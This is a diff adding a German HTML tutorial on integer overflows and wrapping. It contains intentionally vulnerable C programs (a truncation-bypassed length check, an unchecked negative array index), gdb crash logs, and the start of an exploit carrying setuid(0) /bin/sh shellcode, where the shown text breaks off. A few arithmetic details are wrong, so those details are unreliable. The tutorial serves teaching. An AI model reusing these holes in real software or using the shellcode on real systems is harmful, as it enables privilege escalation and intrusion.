@@ -1,0 +1,1250 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Integer Overflows - Illustrated</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body>
+<div align="center">
+  <table width="60%" border="0" align="left">
+    <tr>
+      <td align="left" valign="top"><table width="75%" border="0" align="center">
+          <tr>
+            <td valign="top"><div align="center"><font size="3" face="Verdana, Arial, Helvetica, sans-serif">Integer
+                Overflow &amp; Integer Wrapping<br>
+                - Illustrated -<br>
+                <br>
+                <br>
+                <img src="rock.jpg" width="375" height="266"> <br>
+                </font></div></td>
+          </tr>
+        </table>
+        <div align="justify"><font face="Verdana, Arial, Helvetica, sans-serif"><br>
+          <br>
+          </font>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td bgcolor="#FFCC66"><font face="Verdana, Arial, Helvetica, sans-serif"><strong><font size="2">Vorwort</font></strong></font>
+              </td>
+            </tr>
+          </table>
+          <font face="Verdana, Arial, Helvetica, sans-serif"><br>
+          <font size="2">Dieser Artikel wurde unteranderem erstellt um das Thema
+          von &quot;Integer Overflows&quot; auch f&uuml;r die Menschen verst&auml;ndlich
+          zu machen, die es mit anderen, englischen, Artikeln eventuell etwas
+          schwer haben. Es wird versucht, das Thema so verst&auml;ndlich wie m&ouml;glich
+          zu behandeln, auch f&uuml;r die Leute, die bisher so gut wie kein Erfahrung
+          mit diesem Thema haben. Ich pers&ouml;nlich schreibe diesen Text, als
+          eine art Referenz f&uuml;r mich selbst. Falls Fragen aufkommen sollten
+          oder jemand Fehler endeckt hat, kann er mir diese gerne mitteilen und
+          an &lt;posidron@linuxmail.com&gt; schreiben. <br>
+          <br>
+          <br>
+          </font></font>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td bgcolor="#FFCC66"><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2"><strong>Environment</strong></font></font>
+              </td>
+            </tr>
+          </table>
+          <font face="Verdana, Arial, Helvetica, sans-serif"><font size="2"><strong><br>
+          </strong>S&auml;mtliche Quellcodes wurden unter folgendem System geschrieben
+          und kompiliert.<br>
+          <br>
+          </font></font> </div>
+        <table width="100%" border="0" cellpadding="0" cellspacing="0">
+          <tr valign="top">
+            <td width="22%"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Compiler:</font></td>
+            <td width="78%"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">gcc
+              2.95.4</font></td>
+          </tr>
+          <tr valign="top">
+            <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Debugger:</font></td>
+            <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">gdb
+              2002-04-01-cvs</font></td>
+          </tr>
+          <tr valign="top">
+            <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Operating
+              System:</font></td>
+            <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Debian
+              Linux 2.4.29-vs1.2.10</font></td>
+          </tr>
+          <tr valign="top">
+            <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Architecture:</font></td>
+            <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">i686</font></td>
+          </tr>
+          <tr valign="top">
+            <td>&nbsp;</td>
+            <td>&nbsp;</td>
+          </tr>
+          <tr valign="top">
+            <td>libc/glibc</td>
+            <td>&nbsp;</td>
+          </tr>
+          <tr valign="top">
+            <td>ltrace</td>
+            <td>&nbsp;</td>
+          </tr>
+          <tr valign="top">
+            <td>python</td>
+            <td>&nbsp;</td>
+          </tr>
+        </table>
+        <div align="justify"><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2"><strong>
+          <br>
+          <br>
+          </strong></font></font>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td bgcolor="#FFCC66"><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2"><strong>Einf&uuml;hrung</strong></font></font>
+              </td>
+            </tr>
+          </table>
+          <font face="Verdana, Arial, Helvetica, sans-serif"><font size="2"><strong><br>
+          </strong>Wollen wir uns den Datentyp &quot;Integer&quot; mal genauer
+          ansehen, bevor wir weiter ins Detail gehen. Wenn Sie damit schon vertraut
+          sind, k&ouml;nnen sie gerne diesen Abspann &uuml;berspringen. <br>
+          Unten finden Sie ein Beispiel, welches den Werte Bereich eines &quot;signed
+          Integers&quot; auf Ihrem System wiedergibt.<strong><br>
+          <br>
+          </strong></font></font> </div>
+        <table width="100%" border="0" cellpadding="0" cellspacing="0" bordercolor="#000000">
+          <tr valign="top">
+            <td width="6%" bgcolor="#FFFFFF"><font size="2" face="Courier New, Courier, mono">01:<br>
+              02:<br>
+              03:<br>
+              04:<br>
+              05:<br>
+              06:<br>
+              07:<br>
+              08:<br>
+              09:<br>
+              10:<br>
+              11: </font></td>
+            <td width="94%" height="147" bgcolor="#FFFFFF"><font color="#003399" size="2" face="Courier New, Courier, mono">
+              #include</font><font size="2" face="Courier New, Courier, mono">
+              &lt;stdio.h&gt;<br>
+              <font color="#003399">#include</font> &lt;limits.h&gt;</font><font color="#003366" size="2" face="Courier New, Courier, mono"><br>
+              <font color="#003399">#include</font> <font color="#000000">&lt;inttypes.h&gt;</font><br>
+              <br>
+              int</font><font size="2" face="Courier New, Courier, mono"> <font color="#003399">main</font>
+              (<font color="#003399">void</font>) {<br>
+              <br>
+              &nbsp;&nbsp;printf(&quot;Integer Gr&ouml;&szlig;e : %d Byte\n&quot;,
+              <font color="#003399">sizeof </font>(<font color="#000000">int32_t</font>));<br>
+              &nbsp;&nbsp;printf(&quot;Wertebereich von %d bis %d\n&quot;, INT_MIN,
+              INT_MAX);<br>
+              <br>
+              &nbsp;&nbsp;<font color="#003399">return</font> 0;<br>
+              }</font></td>
+          </tr>
+        </table>
+        <div align="justify"><br>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif">posidron$
+          gcc int_val.c -o int_val.c<br>
+          posidron$ ./int_val<br>
+          Integer Gr&ouml;&szlig;e : 4 Byte<br>
+          Wertebereich von -2147483648 bis 2147483647</font><br>
+          <br>
+          <br>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif">Da wir auf
+          einem 32 Bit System arbeiten, zeigt hier die gr&ouml;&szlig;e eines
+          &quot;signed Integer&quot; Wertes 4 Byte an. Der ANSI Standard definiert
+          einen Integer Wert mit einer Mindestgr&ouml;&szlig;e von 2 Byte. Eine
+          kleine &Uuml;bersicht, zu der Gr&ouml;&szlig;e auf verschiedenen anderen
+          Betriebsystemen, finden Sie im Anhang.<br>
+          <br>
+          Der Basis Datentyp Integer (kurz: int) dient ausschlie&szlig;lich zur
+          Speicherung von ganzzahligen Werten ohne Nachkommastelle. Ein int ist
+          in C automatisch immer signed, also vorzeichenbehaftet. Das Gegenteil
+          von signed ist unsigned, f&uuml;r nicht vorzeichenbehaftet Werte, was
+          nat&uuml;rlich den Speicherraum f&uuml;r positive Zahlen erh&ouml;ht.
+          Ein Datentyp f&uuml;r die Darstellung von nur negativen Zahlen exitiert
+          nicht. <br>
+          <br>
+          Negative signed int Werte werden bin&auml;r erkannt, indem das MSB (most
+          significiant bit) auf 1 gesetzt ist, und bei positiven Werten auf 0.<br>
+          </font><br>
+          <font color="#000000" size="2" face="Verdana, Arial, Helvetica, sans-serif">00000001
+          = 1 (signed
+          int) <br>
+          11111111 =
+          -1</font><font color="#006600" size="2" face="Verdana, Arial, Helvetica, sans-serif"> <font color="#000000">(signed int)</font></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+          <br>
+          <br>
+          Desweiteren existieren noch zwei weitere Datentypen in der Integer Familie
+          neben dem Basistyp. Diese w&auml;ren short und long, mit denen man unteranderem
+          int Werte spezifizieren und erweitern kann, in verschiedenen Kombinationen.<br>
+          <br>
+          </font>
+          <table width="100%" border="0" cellpadding="0" cellspacing="0">
+            <tr>
+              <td width="14%"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">short</font></td>
+              <td width="86%"><font color="#000000" size="2" face="Verdana, Arial, Helvetica, sans-serif">-32768...32767
+                (16 Bit) </font></td>
+            </tr>
+            <tr>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">long</font></td>
+              <td><font color="#000000" size="2" face="Verdana, Arial, Helvetica, sans-serif">-2147483648...2147483647
+                (32 Bit)</font></td>
+            </tr>
+            <tr>
+              <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">long
+                long</font></td>
+              <td><font color="#000000" size="2" face="Verdana, Arial, Helvetica, sans-serif">-9223372036854775808...9223372036854775807
+                (64 Bit) </font></td>
+            </tr>
+          </table>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif"> <br>
+          </font>
+          <p></p>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif"> Die jeweilige
+          Maximale Speichergr&ouml;&szlig;e f&uuml;r ihr System, finden sie in
+          der limits.h definiert. Das Schl&uuml;sselwort int, ist nach dem Schl&uuml;sselwort
+          short oder long bei der Deklaration nicht mehr notwendig z.b wird unsigned
+          short als unsigned short int representiert. Im Anhang sind noch mal
+          alle Integer Datentypen, mit ihren unterschiedlichen Kombinationen aufgelistet.<br>
+          <br>
+          <br>
+          <strong> </strong></font>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td bgcolor="#FFCC66"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Definition</strong></font>
+              </td>
+            </tr>
+          </table>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+          Integer Overflows wurden erstmals ausf&uuml;hrlich in &quot;Professional
+          Source Code Auditing&quot; auf der BlackHat Conference (USA) 2002 vorgestellt.</font><br>
+          <br>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif">Wenn man
+          in einen Integer Datentyp einen gr&ouml;&szlig;eren Wert als vorgesehen
+          ist, hineinschreibt, bezeichnet man dies als &quot;Integer Overflow&quot;
+          bzw. auch als &quot;Integer Wrapping&quot;. Es ist in dieser form nicht
+          m&ouml;glich Speicheradressen zu &uuml;berschreiben wie z.b bei einem
+          generellen Overflow. Dies geschieht - bzw. ist erst bei einem Integer
+          Overflow m&ouml;glich - durch andere Funktionsaufrufe im Funktionslauf.<br>
+          <br>
+          Wenn wir zum Beispiel den gr&ouml;&szlig;ten positivsten Wert eines
+          32 Bit signed Integers nehmen und ihn um eins inkrementieren, erhalten
+          wir als Ergebnis, den gr&ouml;&szlig;ten zu tragenden negativ Wert von
+          einem 32 Bit signed Integer.<br>
+          <br>
+          <font color="#003399">int</font> a, b, c;<br>
+          <br>
+          a = 0x7fffffff;<br>
+          b = 0x1;<br>
+          c = a + b;<br>
+          <br>
+          Als Ergebnis h&auml;llt nun die Variable c den Wert -0x80000000. F&uuml;r
+          vorzeichenbehaftete Integerwerte gilt also MAX(x)+1=MIN(x).<br>
+          <br>
+          Anders als bei einem signed Integer, kann ein unsigned Integer nicht
+          &quot;overflowen&quot;. Sobald der Maximale Speicherwert erreicht worden
+          ist, wird durch eine Modulo Operation wieder von 0 begonnen, sobald
+          man diesen Wert inkrementieren und ihn einer Variable vom gleichem Typ
+          zuweisen will.<br>
+          <br>
+          <font color="#003399">unsigned int</font> a, b, c;<br>
+          <br>
+          a = 0xffffffff<br>
+          b = 0x1<br>
+          c = a + b;<br>
+          <br>
+          Wir f&uuml;gen der Variablen a den Maximalwert f&uuml;r ein unsigned
+          Integer zu. Der Variablen b f&uuml;gen wir 1 zu, als Ergebnis h&auml;llt
+          nun die Variable c den Wert 0. Intern bei der definierung von c, geschieht
+          folgendes:<br>
+          <br>
+          c = (0xffffffff + 0x1) % 0x10000000<br>
+          c = (0x10000000) % 0x10000000<br>
+          c = 0<br>
+          <br>
+          Diese Methoden werden auch &quot;wrap around&quot; genannt und eigenen
+          sich zum Beispiel um verschiedene Abfang abfragen zu umgehen.<br>
+          <br>
+          &nbsp;&nbsp; <br>
+          </font>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td bgcolor="#FFCC66"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Wrapping
+                Methode</strong></font> </td>
+            </tr>
+          </table>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+          Folgendes kleine Beispiel soll nun die &quot;wrap around&quot; Methode
+          demonstrieren, indem wir eine if - Abfrage, mit einem &quot;g&uuml;ltigem&quot;
+          Wert umgehen und somit einen Segmentation fault erzeugen. Dies geschieht
+          indem wir einen, zu kleinen, nicht daf&uuml;r vorgesehenen Datentyp
+          mit einem zu gro&szlig;en Wert definieren wollen.<br>
+          <br>
+          </font>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr valign="top">
+              <td width="6%" height="528"><font size="2" face="Courier New, Courier, mono">01:<br>
+                02:<br>
+                03:<br>
+                04:<br>
+                05:<br>
+                06:<br>
+                07:<br>
+                08:<br>
+                09:<br>
+                10:<br>
+                11:<br>
+                12:<br>
+                13:<br>
+                14:<br>
+                15:<br>
+                16:<br>
+                17:<br>
+                18:<br>
+                19:<br>
+                20:<br>
+                21:<br>
+                22:<br>
+                23:<br>
+                24:<br>
+                25:<br>
+                26:<br>
+                27:<br>
+                28:<br>
+                29:<br>
+                30:<br>
+                31:<br>
+                32:<br>
+                33:</font></td>
+              <td width="94%"><font size="2" face="Courier New, Courier, mono"><font color="#003399">#include</font>
+                &lt;stdio.h&gt;<br>
+                <font color="#003399">#include</font> &lt;string.h&gt;<br>
+                <font color="#003399">#include</font> &lt;inttypes.h&gt;<br>
+                <br>
+                <font color="#003399">#define</font> MAX_SIZE 256<br>
+                <br>
+                <font color="#003399">int main</font> (<font color="#003399">int</font>
+                argc, <font color="#003399">char</font> **argv) {<br>
+                &nbsp;&nbsp;int32_t i;<br>
+                &nbsp;&nbsp;<font color="#000000">uint16_t</font> j;<br>
+                &nbsp;&nbsp;<font color="#003399">char</font> *buf = NULL;<br>
+                <br>
+                &nbsp;&nbsp;buf = (<font color="#003399">char</font> *)malloc(MAX_SIZE);<br>
+                <br>
+                &nbsp;&nbsp;i = atoi(argv[1]);<br>
+                &nbsp;&nbsp;j = i;<br>
+                <br>
+                &nbsp;&nbsp;<font color="#003399">if</font> (j &gt;= MAX_SIZE)
+                {<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;too long, exiting...\n&quot;);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;free(buf); <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<font color="#003399">return</font> -2;<br>
+                &nbsp;&nbsp;}<br>
+                <br>
+                &nbsp;&nbsp;printf(&quot;i: %d\nj: %d\n&quot;, i, j);<br>
+                <br>
+                &nbsp;&nbsp;memcpy(buf, argv[2], i);<br>
+                &nbsp;&nbsp;*(buf+i) = 0x0;<br>
+                &nbsp;&nbsp;<br>
+                &nbsp;&nbsp;printf(&quot;buf: %s\n&quot;, buf);<br>
+                <br>
+                &nbsp;&nbsp;free(buf);<br>
+                <br>
+                &nbsp;&nbsp;<font color="#003399">return</font> 0;<br>
+                } </font></td>
+            </tr>
+          </table>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif"> <font color="#000000"><br>
+          posidron$ gcc eg1_wrap.c -o eg1_wrap.c<br>
+          posidron$ ./eg1_wrap 5 hello<br>
+          i val: 5<br>
+          j val: 5<br>
+          buf: hello<br>
+          posidron$ ./eg1_wrap 100 hello<br>
+          too long, exiting...<br>
+          posidron$ ./eg1_wrap 65536 hello<br>
+          i val: 65536<br>
+          j val: 0<br>
+          Segmentation fault</font></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+          <font color="#000000">posidron$</font></font><br>
+          <br>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif">In diesem
+          Beispiel nutzen wir j dazu aus, um an der if Abfrage vorbei zu kommen,
+          somit ist es m&ouml;glich 65536 bytes nach buf zu kopieren und einen
+          overflow in memcpy() zu produzieren.</font> <font size="2" face="Verdana, Arial, Helvetica, sans-serif">Dabei
+          wird i an j zugewiesen, welcher einen kleineren Datentyp als j hat,
+          dieser kann nur <font color="#000000">65535 bytes speichern und da er
+          vom Typ unsigned ist, wird eine Modulo Operation ausgef&uuml;hrt und
+          springt bei einem Wert von <font size="2" face="Verdana, Arial, Helvetica, sans-serif">USHORT_MAX+1
+          wieder auf 0 zur&uuml;ck. </font></font><br>
+          </font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+          <br>
+          <br>
+          </font>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td bgcolor="#FFCC66"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Arithmetic
+                Overflow</strong></font> </td>
+            </tr>
+          </table>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+          Integer Overflows lassen sich in drei Kategorien einteilen, Addition-,
+          Subtraktion- und Multiplikation Overflows.<br>
+          <br>
+          <br>
+          <strong>Addition</strong><br>
+          <br>
+          </font>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr valign="top">
+              <td width="6%"><font size="2" face="Courier New, Courier, mono">1:<br>
+                2:<br>
+                3:<br>
+                4:<br>
+                5:</font></td>
+              <td width="94%"><font color="#003399" size="2" face="Courier New, Courier, mono">
+                char</font><font size="2" face="Courier New, Courier, mono"> *buf;<br>
+                <font color="#003399">int</font> alloc_size = attack_size + 16;<br>
+                <br>
+                buf = malloc(alloc_size);<br>
+                memcpy(buf, input, attack_size);</font></td>
+            </tr>
+          </table>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+          <br>
+          <strong>Subtraktion</strong> <br>
+          <br>
+          </font>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr valign="top">
+              <td width="6%"><font size="2" face="Courier New, Courier, mono">1:<br>
+                2:<br>
+                3:<br>
+                4:<br>
+                5:<br>
+                6:<br>
+                7:<br>
+                8:</font></td>
+              <td width="94%"><font color="#003399" size="2" face="Courier New, Courier, mono">#define</font><font size="2" face="Courier New, Courier, mono">
+                HEADER_SIZE 16<br>
+                <br>
+                <font color="#003399">char</font> data[1024], *dest;<br>
+                <font color="#003399">int</font> n;<br>
+                <br>
+                n = read(sock, data, sizeof(data));<br>
+                dest = malloc(n);<br>
+                memcpy(dest, data + HEADER_SIZE, n - HEADER_SIZE);</font></td>
+            </tr>
+          </table>
+          <br>
+          <br>
+          <strong><font color="#000000" size="2" face="Verdana, Arial, Helvetica, sans-serif">Multiplikation</font></strong><br>
+          <br>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr valign="top">
+              <td width="6%"><font size="2" face="Courier New, Courier, mono">1:<br>
+                2:<br>
+                3:<br>
+                4:<br>
+                5: <br>
+                6:<br>
+                7: </font></td>
+              <td width="94%"><font size="2" face="Courier New, Courier, mono">nresp
+                = packet_get_ini();<br>
+                <br>
+                if (nresp &gt; 0) {<br>
+                &nbsp;&nbsp;response = xmalloc(nresp * <font color="#003399">sizeof</font>&nbsp;(<font color="#003399">char</font>
+                *));<br>
+                &nbsp;&nbsp;<font color="#003399">for</font> (i = 0; i &lt; nresp;
+                i++)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;response[i] = packet_get_string(NULL);<br>
+                } </font></td>
+            </tr>
+          </table>
+
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif"> <br>
+          </font><font size="2"><strong><br>
+          </strong></font><br>
+          <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FF6633">
+            <tr>
+              <td bgcolor="#FFCC66"><font size="2"><strong><font face="Verdana, Arial, Helvetica, sans-serif">Stack
+                Based Integer Overflow</font></strong></font></td>
+            </tr>
+          </table>
+          <br>
+          <font size="2" face="Verdana, Arial, Helvetica, sans-serif">Als n&auml;chstes
+          wollen wir uns dem direktem &uuml;berschreiben von Speicheraddressen
+          widmen, in dem wir einzelne Elemente eines Integer Arrays &quot;overflowen&quot;.
+          In diesem Beispiel gehen wir in den Negativen Bereich des Arrays, da
+          f&uuml;r diesen keine Abfangregelung getroffen wurde. Bei einem unsigned
+          integer als index Wert, haetten wir den Wert UINT_MAX+1 nehmen koennen,
+          um &uuml;ber das Array hinaus zu schreiben. So produzieren wir hier
+          einen &quot;underflow&quot;.<br>
+          <br>
+          </font>
+          <table width="100%" border="0" cellpadding="0" cellspacing="0">
+            <tr valign="top">
+              <td width="6%"><font size="2" face="Courier New, Courier, mono">01:<br>
+                02:<br>
+                03:<br>
+                04:<br>
+                05:<br>
+                06:<br>
+                07:<br>
+                08:<br>
+                09:<br>
+                10:<br>
+                11:<br>
+                12:<br>
+                13:<br>
+                14:<br>
+                15:<br>
+                16:<br>
+                17:<br>
+                18:<br>
+                19:<br>
+                20:<br>
+                21:<br>
+                22:<br>
+                23:<br>
+                24:<br>
+                25:<br>
+                26:<br>
+                27:<br>
+                28:<br>
+                29:<br>
+                30:<br>
+                31:<br>
+                32:<br>
+                33:<br>
+                34:<br>
+                35:<br>
+                36:<br>
+                37:<br>
+                </font></td>
+              <td width="94%"><p><font size="2" face="Courier New, Courier, mono"><font color="#003399">#include</font>
+                  &lt;stdio.h&gt;<br>
+                  <font color="#003399">#include</font> &lt;stdlib.h&gt;<br>
+                  <font color="#003399">#include</font> &lt;unistd.h&gt;<br>
+                  <font color="#003399">#include</font> &lt;inttypes.h&gt;</font>
+                </p>
+                <p><font color="#003399" size="2" face="Courier New, Courier, mono">#define</font><font size="2" face="Courier New, Courier, mono">
+                  MAX_SIZE 32</font></p>
+                <p><font color="#003399" size="2" face="Courier New, Courier, mono">int</font><font size="2" face="Courier New, Courier, mono">
+                  fill(int32_t i, int32_t val) {<br>
+                  &nbsp;&nbsp;int32_t array[32];</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> <font color="#003399">&nbsp;&nbsp;if</font>(i
+                  &gt;= MAX_SIZE) {<br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;too big, exiting!...\n&quot;);<br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                  &nbsp;&nbsp;}<br>
+                  <font color="#003399">&nbsp;&nbsp;else</font> {<br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;array[i] = val;<br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;array[%d] = %d\n&quot;,
+                  i, val);<br>
+                  &nbsp;&nbsp;}</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> <font color="#003399">&nbsp;&nbsp;return</font>
+                  0;<br>
+                  }</font></p>
+                <p><font color="#003399" size="2" face="Courier New, Courier, mono">int
+                  main</font><font size="2" face="Courier New, Courier, mono">(<font color="#003399">int</font>
+                  argc,c<font color="#003399">har</font> **argv){<br>
+                  &nbsp;&nbsp;int32_t i, val;</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> <font color="#003399">&nbsp;&nbsp;if</font>(argc
+                  &lt; 3)<br>
+                  <font color="#003399">&nbsp;&nbsp;&nbsp;&nbsp;return</font>
+                  -1;</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;i
+                  = atoi(argv[1]);<br>
+                  &nbsp;&nbsp;val = atoi(argv[2]);</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> &nbsp;&nbsp;fill(i,
+                  val);</font></p>
+                <p><font size="2" face="Courier New, Courier, mono"> <font color="#003399">&nbsp;&nbsp;return</font>
+                  0;<br>
+                  }</font></p></td>
+            </tr>
+          </table>
+          <font face="Verdana, Arial, Helvetica, sans-serif">
+          <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><font color="#000000"><br>
+            posidron$ gcc eg2_array.c -o eg2_array.c<br>
+            posidron$ ulimit -c unlimited<br>
+            </font></font><br>
+            <font size="2" face="Verdana, Arial, Helvetica, sans-serif">Um das
+            Array zu Underflowen, addieren wir zu dem Negativen Maximal Wert eines
+            signed Integers die Gr&ouml;&szlig;e des Arrays.</font></p>
+          </font>
+          <table width="100%" border="0" cellspacing="0" cellpadding="0">
+            <tr valign="top">
+              <td width="3%"><font face="Verdana, Arial, Helvetica, sans-serif">&nbsp;</font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+                </font><font face="Verdana, Arial, Helvetica, sans-serif">&nbsp;</font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">&nbsp;
+                </font><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">+</font></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+                </font><font face="Verdana, Arial, Helvetica, sans-serif">&nbsp;</font><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">=</font></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">&nbsp;
+                </font></td>
+              <td width="97%"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">-</font></font><font color="#FF9900">2147483648</font><br>
+                <font color="#FF9900">32</font> <br>
+                <font color="#000000">-</font><font color="#FF6600">2147483615</font>
+                </font></td>
+            </tr>
+          </table>
+          <font face="Verdana, Arial, Helvetica, sans-serif">
+          <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif"> </font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+            posidron$ ./</font><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><font color="#000000">eg2_array</font></font></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+            -2147483616 1<br>
+            array[-2147483616] = 1<br>
+            Segmentation fault (core dumped)<br>
+            posidron$ gdb -q -c core<br>
+            Core was generated by `./</font><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><font color="#000000">eg2_array</font></font></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+            -2147483616 1'.<br>
+            Program terminated with signal 11, Segmentation fault.<br>
+            #0 0x080484f0 in ?? ()<br>
+            (gdb) quit<br>
+            posidron$</font><br>
+            <font size="2" face="Verdana, Arial, Helvetica, sans-serif">posidron$
+            ./</font><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><font color="#000000">eg2_array</font></font></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+            -2147483615 1<br>
+            array[-2147483615] = 1<br>
+            Segmentation fault (core dumped)<br>
+            posidron$ gdb -q -c core<br>
+            Core was generated by `./</font><font face="Verdana, Arial, Helvetica, sans-serif"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><font color="#000000">eg2_array</font></font></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+            -2147483615 1'.<br>
+            Program terminated with signal 11, Segmentation fault.<br>
+            #0 0x00000001 in ?? ()<br>
+            (gdb) quit</font><br>
+            <font size="2" face="Verdana, Arial, Helvetica, sans-serif">posidron$</font><br>
+            <br>
+            <font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+            Schreiben wir nun unser erstes Exploit zu diesem Thema, f&uuml;r das
+            obige Beispiel: </font></p>
+          </font>
+          <table width="100%" border="0" cellpadding="0" cellspacing="0">
+            <tr valign="top">
+              <td width="6%"><font size="2" face="Courier New, Courier, mono">01:<br>
+                02:<br>
+                03:<br>
+                04:<br>
+                05:<br>
+                06:<br>
+                07:<br>
+                08:<br>
+                09:<br>
+                10:<br>
+                11:<br>
+                12:<br>
+                13:<br>
+                14:<br>
+                15:<br>
+                16:<br>
+                17:<br>
+                18:<br>
+                19:<br>
+                20:<br>
+                21:<br>
+                22:<br>
+                23:<br>
+                24:<br>
+                25:<br>
+                26:<br>
+                27:<br>
+                28:<br>
+                29:<br>
+                30:<br>
+                31:<br>
+                32:<br>
+                33:<br>
+                34:<br>
+                35:<br>
+                36:<br>
+                37:<br>
+                38:<br>
+                39:<br>
+                40:<br>
+                41: <br>
+                42:<br>
+                43:<br>
+                44:<br>
+                45:<br>
+                46: </font> </td>
+              <td width="94%"><p><font size="2" face="Courier New, Courier, mono"><font color="#003399">#include</font>
+                  &lt;stdio.h&gt;<br>
+                  <font color="#003399">#include</font> &lt;stdlib.h&gt;<br>
+                  <font color="#003399">#include</font> &lt;string.h&gt;<br>
+                  <font color="#003399">#include</font> &lt;unistd.h&gt;<br>
+                  <font color="#003399">#include</font> &lt;inttypes.h&gt;<br>
+                  <font color="#006600"><br>
+                  /* my 38 byte setuid(0) linux x86 arch. shellcode */</font><br>
+                  <font color="#003399">char</font> lnxsh[]= &quot;\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50\x68&quot;<br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                  &quot;\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89&quot;<br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                  &quot;\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31&quot;<br>
+                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc0\x31\xdb\xb0\x01\xcd\x80&quot;;<br>
+                  <br>
+                  <font color="#003399">int main</font> (<font color="#003399">int</font>
+                  argc, <font color="#003366">c<font color="#003399">har</font></font>
+                  **argv) {<br>
